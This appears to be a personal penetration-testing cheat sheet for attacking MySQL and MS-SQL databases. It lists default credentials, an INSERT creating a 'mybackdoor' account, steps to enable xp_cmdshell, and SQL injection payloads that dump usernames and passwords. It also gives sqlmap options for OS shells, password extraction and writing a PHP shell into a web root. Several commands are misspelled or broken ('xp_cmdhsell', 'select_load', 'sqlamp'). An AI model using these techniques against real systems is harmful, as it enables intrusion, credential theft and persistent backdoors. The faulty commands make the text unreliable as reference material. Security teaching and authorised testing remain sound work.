# SQL

**Ports**
- 3306/mysql
- 1433/ms-sql

**Default credentials**
- root:
- root:root
- sa:
- sa:sa

## Basic SQL statements
```
# Log in as user root, prompt for password, to db database.
mysql -u root -p"" *database*
mysql -h HOST -u root -p""

select @@version;
select version();

version()
database()
user()

# Basics, get a hash
SHOW DATABASES;
SHOW TABLES;
SELECT * FROM users;
SELECT * FROM mydb.users;
INSERT INTO mydb.users(username,password) VALUES ("mybackdoor","pw");

# Show table information
DESCRIBE table;

# Extract hash with special char
SELECT TO_BASE64(password) FROM accounts WHERE id = 1;
```

When in interactive mode, if run as sudo, do `!/bin/sh` for shell.

For additional functionality, look into UDFs.

## Read and write files

Read from file:

```
select_load('/etc/passwd')
```

Write to file:

```
select 'this is my payload' into outfile 'C:\temp\payload.txt'
```

## Running system commands

### xp_cmdshell

```
xp_cmdhsell 'whoami'
```

Activate xp_cmdshell:

```
exec sp_configure 'show_advanced_options',1;
reconfigure;
exec sp_configure 'xp_cmdshell',1;
reconfigure;
```

### Creating jobs

Google it.

### do_system

```
select do_system('id');
```

## SQL injections

Basics

```
' # All SQLi starts here, with the end of a string.
-- # Comments out the rest of the query.
# is also a comment.

# Run a bunch of characaters into input fields to see if something happens
!@#$%^&*()_+-=[]\{}|;':"<>?,./asdfghjkl1234567890

# Or look for logic injections, like a GET parameter id=3-1 is the same as id=2.
```

Basic OR bypassed

```
# Ends string, returns true, comments out query
'OR 1=1 --

# Also limits amount of results, a user/pw should probably only match one record.
'OR 1=1 LIMIT 1;--
```

UNION, must match number of columns received/displayed, pad with numbers

```
# 1,2 are padding
union select 1,2,table_schema from information_schema.tables;

# Get all the good stuff
union select all 1,username,password from users;
```

```
# When you have to return in a function, you can use group_concat.

# List databases
group_concat(schema_name) from information_schema.schemata

# List tables
group_concat(table_name) from information_schema.tables where table_schema='DB_NAME'

# List columns
group_concat(column_name) from information_schema.colums where table_schema='DB_NAME' and table_name='TABLE_NAME'
```

## SQLmap

Tweak with choosing technique if already found something.

```
sqlmap -h | -hh
sqlmap -u http://x.x.x.x/something
sqlmap -u http://x.x.x.x/something --batch
sqlmap -u http://x.x.x.x/something?id=1?two=one -p id
--random-agent
--data 'id=1&username=admin'
```

**Saved requests**

It's really useful to save requests and feed them to sqlmap to get the rigth parameters. You can manually save them from firefox dev tools(network), copy headers and data. Or just use burpsuite.

```
sql -r myfile.req --batch

sql -r request.txt
```

**Databse enumeration**

Just dump it:

```
sqlmap ... --dump-all --exclude-sysdbs
sqlamp ... -a # Retrieve everything
```

Be more specific:

```
-D DBNAME
-T TABLENAME

# Search for a table named users.
--search -T users

--dump
```

More arguments:

```
--banner
--hostname
--passwords
--current-db
--current-user
--is-dba
```

**Sqlmap specialities**

```
--os-shell
--file-read=FILE.txt
--file-write=source.php --file-destination=/var/www/html/shell.php
```

**SQLi in cookie values**

Will need sqlmap to be in level 2 or above and set with the following values:

```
sqlmap -r request.txt --param-filter='COOKIE' --level=2
# In this case the request contains cookie values, otherwise, specify them.
```
